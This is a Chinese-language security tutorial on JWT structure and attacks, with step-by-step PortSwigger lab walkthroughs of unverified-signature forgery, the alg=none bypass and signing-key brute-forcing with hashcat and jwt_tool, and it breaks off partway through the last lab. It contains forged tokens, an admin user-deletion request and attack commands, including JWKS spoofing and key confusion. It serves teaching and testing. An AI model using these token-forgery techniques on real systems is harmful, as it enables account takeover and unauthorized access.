

# JWT渗透姿势一篇通 - 先知社区

JWT渗透姿势一篇通

* * *

### 文章前言

企业内部产品应用使用JWT作为用户的身份认证方式，在对应用评估时发现了新的关于JWT的会话安全带来的安全问题，后期再整理时又加入了之前遗留的部分JWT安全问题，至此汇总成一篇完整的JWT文章

### 简单介绍

JWT(JSON Web Token)是一种用于身份认证和授权的开放标准，它通过在网络应用间传递被加密的JSON数据来安全地传输信息使得身份验证和授权变得更加简单和安全，JWT对于渗透测试人员而言可能是一种非常吸引人的攻击途径，因为它们不仅是让你获得无限访问权限的关键而且还被视为隐藏了通往以下特权的途径，例如:特权升级、信息泄露、SQLi、XSS、SSRF、RCE、LFI等

### 基础概念

*   JWS：Signed JWT，签名过的JWT
*   JWK：JWT的密钥，也就是我们常说的SECRET
*   JWE：Encrypted JWT部分payload经过加密的JWT
*   JKU：JKU(JSON Web Key Set URL)是JWT Header中的一个字段，字段内容是一个URI，该URI用于指定用于验证令牌秘钥的服务器，该服务器用于回复JWK
*   X5U：X5U是JWT Header中的一个字段，指向一组X509公共证书的URL，与JKU功能类似
*   X.509标准：X.509标准是密码学里公钥证书的格式标准，包括TLS/SSL(WWW万维网安全浏览的基石)在内的众多Internet协议都应用了X.509证书）

### 基本结构

JWT(JSON Web Token)的结构由三部分组成，分别是Header、Payload和Signature，下面是每一部分的详细介绍和示例：

#### Header

Header包含了JWT使用的算法和类型等元数据信息，通常使用JSON对象表示并使用Base64编码，Header中包含两个字段：alg和typ  
alg(algorithm)：指定了使用的加密算法，常见的有HMAC、RSA和ECDSA等算法  
typ(type)：指定了JWT的类型，通常为JWT

下面是一个示例Header：

```plain
{
  "alg": "HS256",
  "typ": "JWT"
}
```

其中alg指定了使用HMAC-SHA256算法进行签名，typ指定了JWT的类型为JWT

#### Payload

Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64编码，Payload中包含三个类型的字段：注册声明、公共声明和私有声明

*   公共声明(Public Claims)：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等
*   私有声明(Private Claims)：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等
*   注册声明(Registered Claims)：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等

下面是一个示例Payload：

```plain
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

其中sub表示主题，name表示名称，iat表示JWT的签发时间

#### Signature

Signature是使用指定算法对Header和Payload进行签名生成的，用于验证JWT的完整性和真实性，Signature的生成方式通常是将Header和Payload连接起来然后使用指定算法对其进行签名，最终将签名结果与Header和Payload一起组成JWT，Signature的生成和验证需要使用相同的密钥，下面是一个示例Signature

```plain
HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)
```

其中HMACSHA256是使用HMAC SHA256算法进行签名，header和payload是经过Base64编码的Header和Payload，secret是用于签名和验证的密钥，最终将Header、Payload和Signature连接起来用句点(.)分隔就形成了一个完整的JWT，下面是一个示例JWT，其中第一部分是Header，第二部分是Payload，第三部分是Signature，注意JWT 中的每一部分都是经过Base64编码的，但并不是加密的，因此JWT中的信息是可以被解密的

```plain
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

#### 在线平台

下面是一个JWT在线构造和解构的平台：  
[https://jwt.io/](https://jwt.io/)

[![](assets/1701606917-97d6e4a8b1425e29bb6ad02a0e291031.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140720-43dd654c-6bea-1.png)

### 工作原理

#### JWT工作原理

JWT的工作流程如下：

*   用户在客户端登录并将登录信息发送给服务器
*   服务器使用私钥对用户信息进行加密生成JWT并将其发送给客户端
*   客户端将JWT存储在本地，每次向服务器发送请求时携带JWT进行认证
*   服务器使用公钥对JWT进行解密和验证，根据JWT中的信息进行身份验证和授权
*   服务器处理请求并返回响应，客户端根据响应进行相应的操作

#### JKU工作原理

Step 1：用户携带JWS(带有签名的JWT)访问应用  
[![](assets/1701606917-ee532322d20fd97c3bad001b02c8aad7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140753-578debca-6bea-1.png)  
Step 2：应用程序解码JWS得到JKU字段  
[![](assets/1701606917-9c30bdc297b57eb60131f0a2126e5dea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140817-664f1652-6bea-1.png)  
Step 3：应用根据JKU访问返回JWK的服务器  
[![](assets/1701606917-431424aaea8f46a1f904ca714705b5a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140828-6cd449f2-6bea-1.png)  
Step 4：应用程序得到JWK  
[![](assets/1701606917-f7917f5d439a3be3a3f5e71ac7c99028.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140839-73839ac8-6bea-1.png)  
Step 5：使用JWK验证用户JWS  
[![](assets/1701606917-302632d29d3d06bb9b3207a1b1b329e6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140850-79d3927a-6bea-1.png)  
Step 6：验证通过则正常响应

[![](assets/1701606917-3678a0aae272ac968a5c5c93009665e8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016140902-80b55c68-6bea-1.png)

### 漏洞攻防

#### 签名未校验

##### 验证过程

JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：

*   分离解构：JWT的Header和Payload是通过句点(.)分隔的，因此需要将JWT按照句点分隔符进行分离
*   验证签名：通过使用指定算法对Header和Payload进行签名生成签名结果，然后将签名结果与JWT中的签名部分进行比较，如果两者相同则说明JWT的签名是有效的，否则说明JWT的签名是无效的
*   验证信息：如果JWT的签名是有效的则需要对Payload中的信息进行验证，例如:可以验证JWT中的过期时间、发行者等信息是否正确，如果验证失败则说明JWT是无效的

下面是一个使用JAVA进行JWT签名验证的示例代码：

```plain
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

import java.util.Date;

public class JWTExample {

    private static final String SECRET_KEY = "my_secret_key";

    public static void main(String[] args) {
        // 构建 JWT
        String jwtToken = Jwts.builder()
                .setSubject("1234567890")
                .claim("name", "John Doe")
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + 3600000)) // 1 hour
                .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
                .compact();

        // 验证 JWT
        try {
            // 分离 Header, Payload 和 Signature
            String[] jwtParts = jwtToken.split("\\.");
            String header = jwtParts[0];
            String payload = jwtParts[1];
            String signature = jwtParts[2];

            // 验证签名
            String expectedSignature = Jwts.parser()
                    .setSigningKey(SECRET_KEY)
                    .parseClaimsJws(jwtToken)
                    .getSignature();
            if (!signature.equals(expectedSignature)) {
                throw new RuntimeException("Invalid JWT signature");
            }

            // 验证 Payload 中的信息
            Claims claims = Jwts.parser()
                    .setSigningKey(SECRET_KEY)
                    .parseClaimsJws(jwtToken)
                    .getBody();
            System.out.println("Valid JWT");
        } catch (Exception e) {
            System.out.println("Invalid JWT: " + e.getMessage());
        }
    }
}
```

在上面的示例代码中使用jwt库进行JWT的签名和验证，首先构建了一个JWT，然后将其分离为Header、Payload和Signature三部分，使用parseClaimsJws函数对JWT进行解析和验证，从而获取其中的Payload中的信息并进行验证，最后如果解析和验证成功，则说明JWT是有效的，否则说明JWT是无效的，在实际应用中应该将SECRET\_KEY替换为应用程序的密钥

##### 漏洞案例

JWT库会通常提供一种验证令牌的方法和一种解码令牌的方法，比如:Node.js库jsonwebtoken有verify()和decode()，有时开发人员会混淆这两种方法，只将传入的令牌传递给decode()方法，这意味着应用程序根本不验证签名，而我们下面的使用则是一个基于JWT的机制来处理会话，由于实现缺陷服务器不会验证它收到的任何JWT的签名，如果要解答实验问题，您需要修改会话令牌以访问位于/admin的管理面板然后删除用户carlos，您可以使用以下凭据登录自己的帐户:wiener:peter  
靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)  
[![](assets/1701606917-3d9dd0af5b3fba9c40ddd42e49769660.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141025-b282dbda-6bea-1.png)  
演示步骤：  
Step 1：点击上方的"Access the Lab"访问靶场并登录账户  
[![](assets/1701606917-1670585ec9fee0e5a1b6d92ae41a7974.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141103-c8fb2ff2-6bea-1.png)  
Step 2：进入到Web界面并登录靶场账户

```plain
wiener:peter
```

[![](assets/1701606917-d5ce4ec0546ae2381c174c0732c740c0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141126-d690f2dc-6bea-1.png)

[![](assets/1701606917-f34651a01b3f9fe4d7ea23a19f08ff1b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141133-db38de3a-6bea-1.png)  
登录之后会看到如下一个更新邮箱的界面  
[![](assets/1701606917-a12b0203003451183c3c9ac3e1f23f5d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141145-e1fa9e2a-6bea-1.png)  
Step 3：此时在我们的burpsuite中我们可以看到如下的会话信息

[![](assets/1701606917-1581137e538c3d3aef9e586094e3669e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141205-ee286916-6bea-1.png)  
此时查询当前用户可以看到会显示当前用户为wiener：

[![](assets/1701606917-1e115039c7723dec2f2d4a9713884814.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141222-f83e6a36-6bea-1.png)  
截取上面中间一部分base64编码的部分更改上面的sub为"administrator"

```plain
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5MDA4M30
```

[![](assets/1701606917-f4153a11a80ffad5dd31b7402e0149de.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141247-07230d22-6beb-1.png)  
构造一个sub为"administrator"的载荷并将其进行base64编码处理：

```plain
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTAwODN9
```

[![](assets/1701606917-9524998ed7314c5637802dc63b9ca59c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141305-1206b23e-6beb-1.png)  
替换之后重新发送请求：

[![](assets/1701606917-048e9bfc9fbb3738239408cdd3a4fce3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141322-1bc4c586-6beb-1.png)  
按照题目要求访问/admin路径，发现两个删除用户的调用接口：

[![](assets/1701606917-27573a0f99fe715eec4daad4aa88bc16.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141339-25dc340a-6beb-1.png)

请求敏感链接——删除用户carlos

```plain
GET /admin/delete?username=carlos HTTP/1.1
```

[![](assets/1701606917-2cef280f3c645514df802411d5265581.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141402-33ce9c74-6beb-1.png)  
完成靶场的解答：

[![](assets/1701606917-ea51b576ab3bc1904ab66b7560d1a93d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141418-3d035208-6beb-1.png)

#### 签名用None

##### 场景介绍

在JWT的Header中alg的值用于告诉服务器使用哪种算法对令牌进行签名，从而告诉服务器在验证签名时需要使用哪种算法，目前可以选择HS256，即HMAC和SHA256，JWT同时也支持将算法设定为"None"，如果"alg"字段设为"None"，则标识不签名，这样一来任何token都是有效的，设定该功能的最初目的是为了方便调试，但是若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为"None"来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站

```plain
{
    "alg": "none",
    "typ": "JWT"
}
```

##### 漏洞案例

实验靶场：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)

[![](assets/1701606917-3c6c3f7c79a0eacfd8605ef396426fec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141551-74f77356-6beb-1.png)  
实验流程：  
Step 1：点击上方的"Access the lab"访问靶场环境  
[https://0a9c00a8030ba77784d7b92d00cc0086.web-security-academy.net/](https://0a9c00a8030ba77784d7b92d00cc0086.web-security-academy.net/)

[![](assets/1701606917-2a84dc361ea84f3eb5839d1404a1e902.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141605-7cd2a5be-6beb-1.png)  
Step 2：使用账户密码进行登录

```plain
wiener:peter
```

[![](assets/1701606917-62f242eab3ea530102ded97b7b83feea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141626-89d9387c-6beb-1.png)  
Step 3：登录之后可以看到如下界面

[![](assets/1701606917-4228326e18dba668010027f428176fa7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141640-91d6968c-6beb-1.png)  
Step 4：捕获到的数据报信息如下所示

[![](assets/1701606917-a86690f397cd8d4206d2297c2ecfa179.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141653-99c4c74c-6beb-1.png)  
截取JWT的第二部分对其进行base64解码:

```plain
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5MzQ5M30
```

[![](assets/1701606917-522b71491b88a1b18ae8e8e42a180d6c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141720-a981af42-6beb-1.png)  
将上述的sub字段值更改为"administrator"

```plain
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODc3OTM0OTN9
```

[![](assets/1701606917-4130b45af3b452c21b6ccd21938285ae.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141741-b62c8e42-6beb-1.png)  
Step 4：在使用wiener用户的凭据访问/admin是会提示401 Unauthorized

[![](assets/1701606917-cde8788251778b76d390de4573b2f81d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141758-c08d34ae-6beb-1.png)  
Step 5：将第一步分的alg参数改为none

```plain
eyJraWQiOiIyNmNlNGNmMi0wYjFhLTQzZTUtOWYzNy1kOTA2ZjkxZmY2MzkiLCJhbGciOiJSUzI1NiJ9
```

[![](assets/1701606917-4772659d72a4e4125dca715d2bb806e3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141817-cbd69ba2-6beb-1.png)  
更改之后的header部分：

```plain
eyJraWQiOiIyNmNlNGNmMi0wYjFhLTQzZTUtOWYzNy1kOTA2ZjkxZmY2MzkiLCJhbGciOiJub25lIn0=
```

[![](assets/1701606917-f7f24c506b76d5ead59f530d24f668ad.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141836-d7197c00-6beb-1.png)  
替换JWT Token中的第二部分为之前我们构造的信息，同时移除签名部分，再次请求数据获取到敏感数据链接  
[![](assets/1701606917-f7f6facf08fda84f6086c08465e6d875.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141858-e4155d3e-6beb-1.png)  
调用敏感链接移除用户信息，完成解题操作：  
[![](assets/1701606917-6fad45a995d245a0feb610d565dd9a09.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141915-ee26eb26-6beb-1.png)

[![](assets/1701606917-0982e4898ca65f9e9cf841610e0bed12.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016141925-f453e292-6beb-1.png)

#### 密钥暴力猜解

##### 密钥介绍

在JT中密钥用于生成和验证签名，因此密钥的安全性对JWT的安全性至关重要，一般来说JWT有以下两种类型的密钥：

*   对称密钥：对称密钥是一种使用相同的密钥进行加密和解密的加密算法，在JWT中使用对称密钥来生成和验证签名，因此密钥必须保密，只有发送方和接收方知道，由于对称密钥的安全性取决于密钥的保密性，因此需要采取一些措施来保护它
*   非对称密钥：非对称密钥使用公钥和私钥来加密和解密数据，在JWT中使用私钥生成签名，而使用公钥验证签名，由于公钥可以公开，因此非对称密钥通常用于验证方的身份

下面是一个使用JWT和对称密钥的JAVA示例代码：

```plain
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import java.util.Date;

public class JWTExample {
    private static final String SECRET_KEY = "mysecretkey"; // 设置密钥

    public static void main(String[] args) {
        String token = createJWT("123456"); // 生成JWT
        System.out.println(token);
        String result = parseJWT(token); // 验证JWT
        System.out.println(result);
    }

    public static String createJWT(String id) {
        // 设置JWT过期时间为1小时
        long nowMillis = System.currentTimeMillis();
        Date now = new Date(nowMillis);
        long expMillis = nowMillis + 3600000; // 1小时
        Date exp = new Date(expMillis);

        // 生成JWT
        String token = Jwts.builder()
            .setId(id)
            .setIssuer("issuer")
            .setSubject("subject")
            .setIssuedAt(now)
            .setExpiration(exp)
            .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
            .compact();
        return token;
    }

    public static String parseJWT(String token) {
        // 验证JWT是否合法
        String result = "";
        try {
            result = Jwts.parser()
                .setSigningKey(SECRET_KEY)
                .parseClaimsJws(token)
                .getBody()
                .getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }
}
```

下面是一个使用JWT和非对称密钥的Java示例代码，代码中使用了RSA算法生成非对称密钥对：

```plain
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Date;

public class JWTExample {
    private static final String ISSUER = "example.com";
    private static final String SUBJECT = "user@example.com";

    public static void main(String[] args) throws Exception {
        KeyPair keyPair = generateKeyPair();

        String token = createJWT(ISSUER, SUBJECT, keyPair.getPrivate());
        System.out.println(token);

        Claims claims = parseJWT(token, keyPair.getPublic());
        System.out.println(claims.getIssuer());
        System.out.println(claims.getSubject());
    }

    public static String createJWT(String issuer, String subject, PrivateKey privateKey) {
        Date now = new Date();
        Date expiration = new Date(now.getTime() + 3600 * 1000); // 1 hour

        return Jwts.builder()
            .setIssuer(issuer)
            .setSubject(subject)
            .setIssuedAt(now)
            .setExpiration(expiration)
            .signWith(privateKey, SignatureAlgorithm.RS256)
            .compact();
    }

    public static Claims parseJWT(String token, PublicKey publicKey) {
        return Jwts.parserBuilder()
            .setSigningKey(publicKey)
            .build()
            .parseClaimsJws(token)
            .getBody();
    }

    public static KeyPair generateKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        return generator.generateKeyPair();
    }
}
```

在这个示例中我们使用了Java中的KeyPairGenerator类来生成一个2048位的RSA密钥对，然后使用私钥生成JWT，使用公钥验证JWT，在创建JWT时我们设置了JWT的颁发者、主题、签发时间和过期时间并使用signWith()方法和SignatureAlgorithm.RS256算法使用私钥进行签名，在验证JWT时我们使用公钥来解析JWT并获取声明的内容，在实际的研发编码中我们一方面要妥善保管密钥，另一方面需要使用较为复杂难以被猜解的密钥作为密钥首选，例如：随机字母+数字的32位长度组合

##### 漏洞案例

在实现JWT应用程序时，开发人员有时会犯一些错误，比如：忘记更改默认密码或占位符密码，他们甚至可能复制并粘贴他们在网上找到的代码片段然后忘记更改作为示例提供的硬编码秘密，在这种情况下攻击者使用众所周知的秘密的单词列表来暴力破解服务器的秘密是很容易的，下面是一个公开已知密钥列表：  
[https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

[![](assets/1701606917-045e095f37285fb6bbe264359ec98ff1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142100-2d0cd594-6bec-1.png)  
在这里我们也建议使用hashcat来强力破解密钥，您可以手动安装hashcat，也可以在Kali Linux上使用预先安装好的hashcat，您只需要一个来自目标服务器的有效的、签名的JWT和一个众所周知的秘密的单词表然后就可以运行以下命令，将JWT和单词列表作为参数传入:

```plain
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

Hashcat会使用单词列表中的每个密钥对来自JWT的报头和有效载荷进行签名，然后将结果签名与来自服务器的原始签名进行比较，如果有任何签名匹配，hashcat将按照以下格式输出识别出的秘密以及其他各种详细信息，由于hashcat在本地机器上运行不依赖于向服务器发送请求，所以这个过程非常快，即使使用一个巨大的单词表一旦您确定了密钥，您就可以使用它为任何JWT报头和有效载荷生成有效的签名

```plain
<jwt>:<identified-secret>
```

靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)

[![](assets/1701606917-1f44f7f25d12a288993a1d9c35ba10ad.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142144-475cf726-6bec-1.png)

实验步骤：  
Step 1：点击上述"Access the lab"进入到靶场环境

[![](assets/1701606917-603831bf61ff331d9783f8bdc3e64016.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142205-53b4777e-6bec-1.png)

Step 2：使用以下账户进行登录操作

```plain
wiener:peter
```

[![](assets/1701606917-70882c03d32e7674fb1d9720614e199e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142227-60eb6cfe-6bec-1.png)  
Step 3：捕获到如下有效的JWT凭据信息

```plain
eyJraWQiOiI4M2RhOGNjMi1hZmZiLTRmZGMtYWMwYS1iMWNmMTBkNjkyZGYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5NjQwMn0.IhZV-7RHTpEcQvkcZOA3knCYmQD0YUg-NFMj9fWSFjw
```

[![](assets/1701606917-9af821de26021f9482117f68d0e85410.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142253-705bfc9e-6bec-1.png)

[![](assets/1701606917-216a3689777b7285bb9c7d0d2a008639.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142340-8c1c9d58-6bec-1.png)

Step 5：使用字典进行暴力猜解操作

方式一：HashCat  
项目地址：[https://github.com/hashcat/hashcat](https://github.com/hashcat/hashcat)  
项目使用：

```plain
#命令格式：
hashcat -a 0 -m 16500 <jwt> <wordlist>

#执行示例：
hashcat -m 16500 jwt.txt -a 0 secrets.txt --force
```

[![](assets/1701606917-334efc95463e7d609364e864fc307416.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142440-b00df450-6bec-1.png)

方式二：jwt\_tool  
项目地址：[https://github.com/ticarpi/jwt\_tool](https://github.com/ticarpi/jwt_tool)  
项目介绍：此项目主要用于JWT安全脆弱性评估，目前支持如下几种安全评估测试

*   (CVE-2015-2951) The alg=none signature-bypass vulnerability
*   (CVE-2016-10555) The RS/HS256 public key mismatch vulnerability
*   (CVE-2018-0114) Key injection vulnerability
*   (CVE-2019-20933/CVE-2020-28637) Blank password vulnerability
*   (CVE-2020-28042) Null signature vulnerability

[![](assets/1701606917-6d29b6950c000454fcf0c842e93e9a7e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142500-bc261290-6bec-1.png)  
Step 1：克隆项目到本地

```plain
https://github.com/ticarpi/jwt_tool
```

[![](assets/1701606917-d7e4cc5e1a8ca3a9f4a2bfc17d9c342b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142523-c9eac1d2-6bec-1.png)  
Step 2：安装依赖库

```plain
pip3 install pycryptodomex
```

Step 3：运行jwt\_tool并查看用法信息

```plain
python3 jwt_tool.py -h
```

[![](assets/1701606917-504bc062609271a097dc7699c1a9aea2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142606-e30c42c6-6bec-1.png)

```plain
usage: jwt_tool.py [-h] [-b] [-t TARGETURL] [-rc COOKIES] [-rh HEADERS] [-pd POSTDATA] [-cv CANARYVALUE] [-np] [-nr] [-M MODE] [-X EXPLOIT] [-ju JWKSURL] [-S SIGN] [-pr PRIVKEY] [-T] [-I] [-hc HEADERCLAIM] [-pc PAYLOADCLAIM] [-hv HEADERVALUE]
                   [-pv PAYLOADVALUE] [-C] [-d DICT] [-p PASSWORD] [-kf KEYFILE] [-V] [-pk PUBKEY] [-jw JWKSFILE] [-Q QUERY] [-v]
                   [jwt]

positional arguments:
  jwt                   the JWT to tinker with (no need to specify if in header/cookies)

options:
  -h, --help            show this help message and exit
  -b, --bare            return TOKENS ONLY
  -t TARGETURL, --targeturl TARGETURL
                        URL to send HTTP request to with new JWT
  -rc COOKIES, --cookies COOKIES
                        request cookies to send with the forged HTTP request
  -rh HEADERS, --headers HEADERS
                        request headers to send with the forged HTTP request (can be used multiple times for additional headers)
  -pd POSTDATA, --postdata POSTDATA
                        text string that contains all the data to be sent in a POST request
  -cv CANARYVALUE, --canaryvalue CANARYVALUE
                        text string that appears in response for valid token (e.g. "Welcome, ticarpi")
  -np, --noproxy        disable proxy for current request (change in jwtconf.ini if permanent)
  -nr, --noredir        disable redirects for current request (change in jwtconf.ini if permanent)
  -M MODE, --mode MODE  Scanning mode:
                        pb = playbook audit
                        er = fuzz existing claims to force errors
                        cc = fuzz common claims
                        at - All Tests!
  -X EXPLOIT, --exploit EXPLOIT
                        eXploit known vulnerabilities:
                        a = alg:none
                        n = null signature
                        b = blank password accepted in signature
                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
                        k = key confusion (specify public key with -pk)
                        i = inject inline JWKS
  -ju JWKSURL, --jwksurl JWKSURL
                        URL location where you can host a spoofed JWKS
  -S SIGN, --sign SIGN  sign the resulting token:
                        hs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)
                        rs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)
                        es256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)
                        ps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)
  -pr PRIVKEY, --privkey PRIVKEY
                        Private Key for Asymmetric crypto
  -T, --tamper          tamper with the JWT contents
                        (set signing options with -S or use exploits with -X)
  -I, --injectclaims    inject new claims and update existing claims with new values
                        (set signing options with -S or use exploits with -X)
                        (set target claim with -hc/-pc and injection values/lists with -hv/-pv
  -hc HEADERCLAIM, --headerclaim HEADERCLAIM
                        Header claim to tamper with
  -pc PAYLOADCLAIM, --payloadclaim PAYLOADCLAIM
                        Payload claim to tamper with
  -hv HEADERVALUE, --headervalue HEADERVALUE
                        Value (or file containing values) to inject into tampered header claim
  -pv PAYLOADVALUE, --payloadvalue PAYLOADVALUE
                        Value (or file containing values) to inject into tampered payload claim
  -C, --crack           crack key for an HMAC-SHA token
                        (specify -d/-p/-kf)
  -d DICT, --dict DICT  dictionary file for cracking
  -p PASSWORD, --password PASSWORD
                        password for cracking
  -kf KEYFILE, --keyfile KEYFILE
                        keyfile for cracking (when signed with 'kid' attacks)
  -V, --verify          verify the RSA signature against a Public Key
                        (specify -pk/-jw)
  -pk PUBKEY, --pubkey PUBKEY
                        Public Key for Asymmetric crypto
  -jw JWKSFILE, --jwksfile JWKSFILE
                        JSON Web Key Store for Asymmetric crypto
  -Q QUERY, --query QUERY
                        Query a token ID against the logfile to see the details of that request
                        e.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a
  -v, --verbose         When parsing and printing, produce (slightly more) verbose output.

If you don't have a token, try this one:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po
```

Step 4：暴力猜解密钥

```plain
#命令格式
python3 jwt_tool.py JWT_HERE -C -d dictionary.txt

#执行示例
python3 jwt_tool.py eyJraWQiOiI4M2RhOGNjMi1hZmZiLTRmZGMtYWMwYS1iMWNmMTBkNjkyZGYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5NjQwMn0.IhZV-7RHTpEcQvkcZOA3knCYmQD0YUg-NFMj9fWSFjw -C -d secrets.txt
```

[![](assets/1701606917-0b36cfdb2368536278d760ceda2e432f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142640-f7ba7800-6bec-1.png)  
附加扩展：

```plain
#尝试破解密钥(HMAC算法)
python3 jwt_tool.py JWT_HERE -C -d dictionary.txt

#尝试使用已知的公钥对不对称密码(RS-，EC-，PS-)进行"密钥混淆"攻击
python3 jwt_tool.py JWT_HERE -K -pk my_public.pem

#尝试使用"无"算法来创建未验证的令牌
python3 jwt_tool.py JWT_HERE -A

#处理JSON Web密钥存储文件，重建公共密钥，然后测试密钥以查看验证令牌的密钥
python3 jwt_tool.py JWT_HERE -J -jw jwks.json

#生成一个新的RSA密钥对，将公钥作为JSON Web密钥存储对象注入令牌并使用私钥对令牌签名
python3 jwt_tool.py JWT_HERE -I

#欺骗远程JWKS：生成新的RSA密钥对，将提供的URL注入令牌，将公共密钥导出为JSON Web密钥存储对象(以提供的URL进行服务)并使用私钥对令牌签名
python3 jwt_tool.py JWT_HERE -S -u http://example.com/jwks.json
```

Step 5：随后在网页端重新设置密钥(secret1)并重新产生的字符串  
Header：

```plain
eyJraWQiOiJjY2Y4Yjk3YS05NGZlLTRjN2QtOWI2MS0yNzZmMDY1NGMyZWIiLCJhbGciOiJIUzI1NiJ9
{"kid":"ccf8b97a-94fe-4c7d-9b61-276f0654c2eb","alg":"HS256"}
```

[![](assets/1701606917-3de7b7e12d303380e651eae0184aafc1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231016142713-0b1a6874-6bed-1.png)  
payload(前)：

```plain
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Nzc5OTk1OX0
{"iss":"portswigger","sub":"wiener","exp":1687799959}
```

